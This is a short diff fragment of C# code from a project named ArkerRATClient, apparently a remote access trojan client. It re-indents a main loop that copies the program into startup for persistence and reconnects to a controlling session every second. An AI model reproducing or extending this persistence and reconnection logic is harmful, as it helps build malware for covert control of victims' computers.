@@ -16,27 +16,27 @@ namespace ArkerRATClient
     {
         private static void Main(string[] args)
         {
-            CopyItSelfToStartUp();
-            while (true)
-            {
-                if (RATClientSession.noConnection)
+                CopyItSelfToStartUp();
+                while (true)
                 {
-                    Connect();
+                    if (RATClientSession.noConnection)
+                    {
+                        Connect();
+                    }
+                    Thread.Sleep(1000);
                 }
-                Thread.Sleep(1000);
-            }
         }
 
         private static async Task Connect()
         {
-            try
-            {
-                if (!RATClientSession.uninstallFix)
+                try
                 {
-                    RATClientSession.ClientSession();
+                    if (!RATClientSession.uninstallFix)
+                    {
+                        RATClientSession.ClientSession();
+                    }
                 }
-            }
-            catch(Exception ex) { RATClientSession.noConnection = true; }
+                catch (Exception ex) { RATClientSession.noConnection = true; }
         }
 
         private static void CopyItSelfToStartUp()
